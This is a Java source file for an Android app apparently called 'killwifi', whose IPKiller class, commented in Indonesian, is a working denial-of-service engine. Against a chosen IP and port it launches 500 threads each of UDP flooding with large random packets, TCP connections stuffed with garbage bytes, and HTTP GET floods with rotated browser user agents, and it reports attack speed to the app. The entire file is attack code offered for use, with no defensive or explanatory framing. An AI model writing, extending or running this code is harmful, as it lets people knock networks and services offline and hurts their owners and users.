package com.zamzzz.killwifi.core;

import android.util.Log;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Random;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

/**
 * IPKiller - CORE ENGINE
 * Multi-vector attack ke IP target
 */
public class IPKiller {

    private static final String TAG = "IPKiller";

    // TARGET
    private String targetIP;
    private int targetPort;

    // STATUS
    private AtomicBoolean isRunning = new AtomicBoolean(false);
    private AtomicLong packetCount = new AtomicLong(0);
    private AtomicLong byteCount = new AtomicLong(0);

    // THREADS
    private static final int THREAD_COUNT = 500;
    private static final int PACKET_SIZE = 65500;

    // LISTENER
    private OnAttackListener listener;

    public interface OnAttackListener {
        void onProgress(long packets, long bytes, long speed);
        void onStatus(String status);
        void onError(String error);
    }

    public IPKiller(String targetIP, int targetPort) {
        this.targetIP = targetIP;
        this.targetPort = targetPort;
    }

    public void setListener(OnAttackListener listener) {
        this.listener = listener;
    }

    // ═══════════════════════════════════════════
    //  MULAI SERANGAN
    // ═══════════════════════════════════════════
    public void start() {
        if (isRunning.get()) {
            Log.w(TAG, "Attack sudah berjalan!");
            return;
        }

        isRunning.set(true);
        packetCount.set(0);
        byteCount.set(0);

        if (listener != null) {
            listener.onStatus("MEMULAI SERANGAN…");
        }

        // START SEMUA VEKTOR
        for (int i = 0; i < THREAD_COUNT; i++) {
            new Thread(new UDPFlood()).start();
        }
        for (int i = 0; i < THREAD_COUNT; i++) {
            new Thread(new TCPFlood()).start();
        }
        for (int i = 0; i < THREAD_COUNT; i++) {
            new Thread(new HTTPFlood()).start();
        }

        // MONITORING THREAD
        new Thread(new Monitor()).start();
    }

    // ═══════════════════════════════════════════
    //  STOP SERANGAN
    // ═══════════════════════════════════════════
    public void stop() {
        isRunning.set(false);
        if (listener != null) {
            listener.onStatus("SERANGAN DIHENTIKAN");
        }
    }

    public boolean isRunning() {
        return isRunning.get();
    }

    public long getPacketCount() {
        return packetCount.get();
    }

    public long getByteCount() {
        return byteCount.get();
    }

    // ═══════════════════════════════════════════
    //  VEKTOR 1: UDP FLOOD
    // ═══════════════════════════════════════════
    private class UDPFlood implements Runnable {
        @Override
        public void run() {
            Random rand = new Random();
            byte[] buffer = new byte[PACKET_SIZE];

            try {
                InetAddress addr = InetAddress.getByName(targetIP);
                DatagramSocket socket = new DatagramSocket();

                while (isRunning.get()) {
                    try {
                        rand.nextBytes(buffer);
                        DatagramPacket packet = new DatagramPacket(
                            buffer, buffer.length, addr, targetPort);
                        socket.send(packet);

                        packetCount.incrementAndGet();
                        byteCount.addAndGet(PACKET_SIZE);

                    } catch (Exception e) {
                        // Skip error, terus gas
                    }
                }

                socket.close();
            } catch (Exception e) {
                Log.e(TAG, "UDP Error: " + e.getMessage());
            }
        }
    }

    // ═══════════════════════════════════════════
    //  VEKTOR 2: TCP SYN FLOOD
    // ═══════════════════════════════════════════
    private class TCPFlood implements Runnable {
        @Override
        public void run() {
            while (isRunning.get()) {
                Socket socket = null;
                try {
                    socket = new Socket();
                    socket.connect(
                        new java.net.InetSocketAddress(targetIP, targetPort),
                        3000
                    );
                    socket.setSoLinger(true, 0);

                    // Kirim data sampah
                    byte[] garbage = new byte[1024];
                    new Random().nextBytes(garbage);
                    socket.getOutputStream().write(garbage);
                    socket.getOutputStream().flush();

                    packetCount.incrementAndGet();
                    byteCount.addAndGet(1024);

                } catch (Exception e) {
                    // Skip
                } finally {
                    try { if (socket != null) socket.close(); }
                    catch (Exception ignored) {}
                }
            }
        }
    }

    // ═══════════════════════════════════════════
    //  VEKTOR 3: HTTP FLOOD
    // ═══════════════════════════════════════════
    private class HTTPFlood implements Runnable {
        private final String[] USER_AGENTS = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) Safari/17",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile",
            "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile",
        };

        @Override
        public void run() {
            Random rand = new Random();

            while (isRunning.get()) {
                Socket socket = null;
                try {
                    socket = new Socket(targetIP, targetPort);
                    socket.setSoTimeout(3000);

                    StringBuilder req = new StringBuilder();
                    req.append("GET /?").append(rand.nextInt(999999))
                       .append(" HTTP/1.1\r\n");
                    req.append("Host: ").append(targetIP).append("\r\n");
                    req.append("User-Agent: ")
                       .append(USER_AGENTS[rand.nextInt(USER_AGENTS.length)])
                       .append("\r\n");
                    req.append("Accept: */*\r\n");
                    req.append("Connection: keep-alive\r\n\r\n");

                    byte[] data = req.toString().getBytes();
                    for (int i = 0; i < 50; i++) {
                        socket.getOutputStream().write(data);
                    }
                    socket.getOutputStream().flush();

                    packetCount.addAndGet(50);
                    byteCount.addAndGet(data.length * 50L);

                } catch (Exception e) {
                    // Skip
                } finally {
                    try { if (socket != null) socket.close(); }
                    catch (Exception ignored) {}
                }
            }
        }
    }

    // ═══════════════════════════════════════════
    //  MONITOR - Hitung Speed
    // ═══════════════════════════════════════════
    private class Monitor implements Runnable {
        @Override
        public void run() {
            long lastPackets = 0;
            long lastBytes = 0;
            long lastTime = System.currentTimeMillis();

            while (isRunning.get()) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    break;
                }

                long now = System.currentTimeMillis();
                long elapsed = now - lastTime;

                if (elapsed > 0) {
                    long currentPackets = packetCount.get();
                    long currentBytes = byteCount.get();

                    long packetSpeed = ((currentPackets - lastPackets) * 1000) / elapsed;
                    long byteSpeed = ((currentBytes - lastBytes) * 1000) / elapsed;

                    if (listener != null) {
                        listener.onProgress(currentPackets, currentBytes, packetSpeed);
                    }

                    lastPackets = currentPackets;
                    lastBytes = currentBytes;
                    lastTime = now;
                }
            }
        }
    }
}